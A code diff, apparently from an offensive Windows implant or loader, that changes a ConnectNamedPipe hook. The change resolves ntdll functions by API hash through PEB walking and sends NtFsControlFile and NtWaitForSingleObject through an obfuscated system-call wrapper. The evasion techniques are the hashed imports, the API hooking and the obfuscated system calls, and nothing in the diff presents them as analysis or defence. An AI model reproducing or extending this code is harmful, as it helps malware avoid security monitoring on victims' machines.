@@ -15,12 +15,14 @@
 
 typedef struct
 {
+	D_API( NtWaitForSingleObject );
 	D_API( RtlNtStatusToDosError );
 	D_API( RtlSetLastWin32Error );
 	D_API( NtFsControlFile );
 } API ;
 
 /* API Hashes */
+#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
 #define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890 /* RtlNtStatusToDosError */
 #define H_API_RTLSETLASTWIN32ERROR	0xfd303374 /* RtlSetLastWin32Error */
 #define H_API_NTFSCONTROLFILE		0xecdfd601 /* NtFsControlFile */
@@ -48,28 +50,39 @@ D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LP
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );
 
+	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
 	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
 	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
 	Api.NtFsControlFile       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFSCONTROLFILE );
 
-	Nst = Api.NtFsControlFile(
-		hNamedPipe,
-		NULL,
-		NULL,
-		NULL,
-		&Isb,
-		FSCTL_PIPE_LISTEN,
-		NULL,
-		0,
-		NULL,
-		0
+	PVOID Ag1[] = {
+		C_PTR( hNamedPipe ),
+		C_PTR( NULL ),
+		C_PTR( NULL ),
+		C_PTR( NULL ),
+		C_PTR( &Isb ),
+		C_PTR( FSCTL_PIPE_LISTEN ),
+		C_PTR( NULL ),
+		C_PTR( 0 ),
+		C_PTR( NULL ),
+		C_PTR( 0 )
+	};
+	Nst = ObfSystemCall(
+		Api.NtFsControlFile,
+		Ag1,
+		ARRAYSIZE( Ag1 )
 	);
 
 	if ( Nst == STATUS_PENDING ) {
-		Nst = NtWaitForSingleObjectObf(
-				hNamedPipe,
-				FALSE,
-				NULL
+		PVOID Ag2[] = {
+			C_PTR( hNamedPipe ),
+			C_PTR( FALSE ),
+			C_PTR( NULL )
+		};
+		Nst = ObfSystemCall(
+			Api.NtWaitForSingleObject,
+			Ag2,
+			ARRAYSIZE( Ag2 )
 		);
 
 		if ( NT_SUCCESS( Nst ) ) { 
